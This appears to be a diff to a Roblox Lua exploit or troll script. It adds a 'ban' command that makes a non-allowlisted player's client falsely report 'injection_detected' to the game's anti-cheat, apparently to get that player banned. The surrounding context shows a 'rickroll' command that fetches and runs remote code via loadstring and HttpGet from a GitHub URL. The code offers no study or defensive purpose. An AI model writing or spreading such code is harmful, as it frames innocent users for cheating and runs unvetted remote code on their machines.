@@ -77,6 +77,13 @@ end,
             end
         end
     end,
+    ban  = function()
+        if not isplayerallowed(game.Players.LocalPlayer.Name) then 
+            local rs = game:GetService("ReplicatedStorage")
+            local remote = rs:FindFirstChild("SelfReport", true)
+            remote:FireServer("injection_detected")
+        end
+    end,
    rickroll = function()
         if not isplayerallowed(game.Players.LocalPlayer.Name) then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
